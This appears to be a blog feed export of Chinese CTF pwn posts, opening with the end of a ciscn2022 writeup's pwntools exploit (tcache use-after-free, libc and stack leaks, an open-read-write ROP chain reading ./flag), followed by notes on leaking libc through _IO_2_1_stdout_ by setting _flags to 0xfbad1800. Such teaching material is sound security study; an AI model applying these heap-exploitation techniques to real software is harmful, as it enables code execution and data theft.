<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">uaf(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">stdout = libcbase + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(stdout)</span><br><span class="line">add(<span class="number">0x80</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(_flags) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>) * <span class="number">2</span></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>, payload2)</span><br><span class="line">stack = uu64() - <span class="number">0x128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(stack)</span><br><span class="line">add(<span class="number">0x80</span>, payload3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">open:0x10dd10</span></span><br><span class="line"><span class="string">read:0x10dff0</span></span><br><span class="line"><span class="string">write:0x10e090</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">open</span> = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = libcbase + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x23b6a</span></span><br><span class="line">ret = libcbase + <span class="number">0x22679</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0x142c92</span></span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">orw += p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x200</span>) + p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(stack + <span class="number">0x200</span>) + p64(puts)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, orw)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>ciscn2022</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE-leak</title>
    <url>/2022/06/14/IO-FILE-leak/</url>
    <content><![CDATA[<p>利用_IO_2_1_stdout泄露libc</p>
<span id="more"></span>

<h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h1><p>定义在glibc&#x2F;libio&#x2F;libio.h中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>glibc通过单链表<code>_IO_list_all</code>来管理所有的FILE结构体，每个结点之间用<code>_chain</code>来链接</p>
<p><a href="https://imgtu.com/i/X5450f"><img src="https://s1.ax1x.com/2022/06/14/X5450f.jpg" alt="X5450f.jpg"></a></p>
<p>在libioP.h中定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>

<h1 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>里面定义了一个_IO_FILE结构体，还有一个虚表 ，里面包含了IO有关的一系列函数指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="flags字段"><a href="#flags字段" class="headerlink" title="_flags字段"></a>_flags字段</h1><p>这个字段在 <code>_IO_2_1_stdout_</code>泄露libc中起到了很重要的作用</p>
<p><a href="https://imgtu.com/i/X5oD00"><img src="https://s1.ax1x.com/2022/06/14/X5oD00.jpg" alt="X5oD00.jpg"></a></p>
<p>红框标记的位置就是_flags字段</p>
<p>flag字段的高两位字节有libc固定，基本都是0xfbad，不过也得看libc的版本，具体情况具体分析就行了</p>
<p>低两位字节决定了程序的执行状态，宏定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<h1 id="IO-puts"><a href="#IO-puts" class="headerlink" title="_IO_puts"></a>_IO_puts</h1><p>因为利用_IO_2_1_stdout泄露libc主要是针对没有show函数来打印堆块内容的情况，所以我们得尝试找到相应的输出函数并调用它来泄露libc</p>
<p>这里以puts函数为例，来看一下函数执行流程</p>
<p>在libio&#x2F;ioputs.c中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>_IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>继续跟进<code>_IO_XSPUTN</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>

<p>也是一个宏定义，作用是调用<code>_IO_2_1_stdout</code>中虚表指向的<code>_IO_new_file_xsputn</code>函数</p>
<p><code>_IO_new_file_xsputn</code>主要是用来判断缓冲区是否已满或未建立缓冲区，其中调用了<code>_IO_OVERFLOW</code>函数来刷新或者建立缓冲区</p>
<p><a href="https://imgtu.com/i/X5OkgU"><img src="https://s1.ax1x.com/2022/06/14/X5OkgU.jpg" alt="X5OkgU.jpg"></a></p>
<h2 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h2><p>调用<code>_IO_new_file_overflow</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/X5zIHg"><img src="https://s1.ax1x.com/2022/06/14/X5zIHg.jpg" alt="X5zIHg.jpg"></a></p>
<p>这里就是为了达到泄露libc最终需要调用的</p>
<p><code>_IO_do_write</code>函数三个参数分别为</p>
<p>stdout结构体，缓冲区基址，输出的size</p>
<p>如果将write_base改掉，就能泄露libc的目的了</p>
<p>接下来往上翻看看要进入这个if分支需要哪些条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先需要跳过这个if分支的条件，就要让<code>f-&gt;_flags &amp; _IO_NO_WRITES</code>等于0</p>
<p>在前面的宏定义里有这个值，为8，所以让<code>f-&gt;_flags &amp; 8</code>等于0即可绕过这个if</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_flags &amp; _IO_NO_WRITES = 0 </span><br><span class="line">_flags = 0xfbad0000</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>这个if里面会进行一系列初始化的操作，如果进入这个if那我们构造的write_base也会被初始化，就不能达到我们的目的了，所以这里不能进入</p>
<p>后半部分条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">f-&gt;_IO_write_base == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<p>由于我们要构造<code>_IO_write_base</code>，这部分肯定恒为真，只需要看前半部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><code>_IO_CURRENTLY_PUTTING</code>宏定义为800</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad0800</span></span><br></pre></td></tr></table></figure>

<h2 id="IO-do-new-write"><a href="#IO-do-new-write" class="headerlink" title="_IO_do_new_write"></a>_IO_do_new_write</h2><p>绕过了前面的if之后，成功调用<code>_IO_do_write</code>，继续跟进，调用<code>_IO_do_new_write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到再绕过前面的else if就能进行系统调用了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里是个if else if</p>
<p>可以看到绕过else if的条件是<code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>， 让这两个地址相等，这显然是比较难操作的，我们选择进入if来绕过这个分支</p>
<p>让<code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1000</span></span><br></pre></td></tr></table></figure>

<p>综上所诉，要绕过所有的条件，_flags的值应该为0xfbad1800，然后设置<code>_IO_write_base</code> 为我们想要的地址即可</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>tcache利用思路总结</title>
    <url>/2022/07/01/tcache/</url>
    <content><![CDATA[<p>tcache bin 相关知识</p>
<span id="more"></span>

<h1 id="Tcache机制"><a href="#Tcache机制" class="headerlink" title="Tcache机制"></a>Tcache机制</h1><p>Tcache机制是libc2.26开始增加的，tcache bins是64个单链表结构的bins，每个bins最大存放7个对应大小的chunk，chunk的大小在64位中以16字节递增，从24到1032字节，在32位机器上以8字节递增，从12字节到512字节</p>
<h1 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h1><p>这里先以libc2.26的源码来做例子，后面高版本有改动再具体分析</p>
